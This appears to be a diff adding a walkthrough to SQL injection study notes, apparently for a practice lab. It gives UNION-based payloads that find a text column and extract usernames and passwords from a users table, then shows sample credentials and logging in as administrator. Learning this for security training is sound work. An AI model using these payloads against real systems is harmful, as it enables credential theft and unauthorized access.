@@ -131,3 +131,27 @@ To use a `UNION` attack, your injected query must have the **exact same number o
 |**PostgreSQL**|`SELECT version()`|`--`|
 |**Oracle**|`SELECT banner FROM v$version`|`--`|
 |**MS SQL**|`SELECT @@version`|`--`|
+## Step-by-Step Walkthrough
+
+### Step A: Find the String Column
+
+First, confirm which column displays text. `' UNION SELECT 'abc', NULL--` (Error) `' UNION SELECT NULL, 'abc'--` (Success - Column 2 is our target)
+
+### Step B: Craft the Concatenation (PostgreSQL Example)
+
+We want to grab the credentials from the `users` table. We use a separator like `~` or `:` to make it easy to read.
+
+**Payload:** `' UNION SELECT NULL, username || ':' || password FROM users--`
+
+### Step C: Extract the Data
+
+The page will now render the data in that single column like this:
+
+- `administrator:p4ssw0rd`
+    
+- `carlos:qwerty`
+    
+- `wiener:peter`
+    
+
+You can now copy the password for the `administrator` and log in.
